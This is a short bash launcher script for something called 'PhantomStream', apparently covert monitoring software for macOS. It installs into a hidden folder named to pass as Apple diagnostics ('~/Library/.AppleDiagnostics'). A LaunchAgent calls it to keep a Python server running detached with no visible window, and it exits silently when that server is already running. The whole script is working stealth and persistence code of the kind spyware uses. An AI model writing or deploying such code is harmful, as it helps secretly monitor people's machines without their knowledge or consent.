#!/usr/bin/env bash
# wrapper.sh — PhantomStream launcher
# Called by LaunchAgent or start-monitor.sh.
# Runs server.py in background with no visible terminal window.

INSTALL_DIR="$HOME/Library/.AppleDiagnostics"
PID_FILE="$INSTALL_DIR/stream.pid"
LOG_FILE="$INSTALL_DIR/stream.log"

# Guard: already running?
if [[ -f "$PID_FILE" ]]; then
    EXISTING=$(cat "$PID_FILE" 2>/dev/null || echo "")
    STATE=$(ps -o state= -p "$EXISTING" 2>/dev/null | tr -d ' ' || echo "")
    if [[ -n "$STATE" ]] && [[ "$STATE" != "Z" ]]; then
        exit 0   # already running — silent exit (LaunchAgent calls this often)
    fi
    rm -f "$PID_FILE"
fi

# Launch server.py detached from any terminal
# Rotate log to keep it small
[[ -f "$LOG_FILE" ]] && tail -200 "$LOG_FILE" > "$LOG_FILE.tmp" && \
    mv "$LOG_FILE.tmp" "$LOG_FILE" 2>/dev/null || true

nohup /usr/bin/python3 "$INSTALL_DIR/server.py" \
    >> "$LOG_FILE" 2>&1 &

disown $!
